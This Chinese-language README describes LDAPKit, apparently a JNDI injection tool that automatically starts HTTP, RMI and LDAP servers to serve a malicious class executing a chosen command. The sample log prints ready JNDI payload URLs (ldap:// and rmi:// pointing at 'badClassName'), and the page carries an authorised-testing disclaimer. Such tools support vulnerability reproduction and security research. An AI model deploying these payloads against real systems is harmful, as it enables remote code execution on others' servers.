# LDAPKit

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/Java-8-red)

**工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责**

## 简介

自用的`LDAP`工具（无高级用法仅支持简单的漏洞复现）

无需自行编译`Java`文件和开启`HTTP`服务，一切自动

只要一行：`java -jar LDAPKit.jar [命令]`

例如：`java -jar LDAPKit.jar notepad.exe`

```text
    ___  ________   ________  ___  ___  __    ___  _________   
   |\  \|\   ___  \|\   ___ \|\  \|\  \|\  \ |\  \|\___   ___\ 
   \ \  \ \  \\ \  \ \  \_|\ \ \  \ \  \/  /|\ \  \|___ \  \_| 
 __ \ \  \ \  \\ \  \ \  \ \\ \ \  \ \   ___  \ \  \   \ \  \  
|\  \\_\  \ \  \\ \  \ \  \_\\ \ \  \ \  \\ \  \ \  \   \ \  \ 
\ \________\ \__\\ \__\ \_______\ \__\ \__\\ \__\ \__\   \ \__\
 \|________|\|__| \|__|\|_______|\|__|\|__| \|__|\|__|    \|__|
19:13:27 [INFO] [org.sec.ServerMain] start jndi kit
19:13:27 [INFO] [org.sec.ServerMain] cmd: calc.exe
19:13:27 [INFO] [org.sec.Http] start http server: 0.0.0.0:8000
19:13:27 [INFO] [org.sec.RMI] start rmi registry 0.0.0.0:1099
19:13:27 [INFO] [org.sec.Ldap] start ldap server: 0.0.0.0:1389
|--------------------------------------------------------|
|------Payload: ldap://127.0.0.1:1389/badClassName-------|
|------Payload: rmi://127.0.0.1:1099/badClassName-------|
|--------------------------------------------------------|
```

## 免责申明

**未经授权许可使用`LDAPKit`攻击目标是非法的**

**本程序应仅用于授权的安全测试与研究目的**


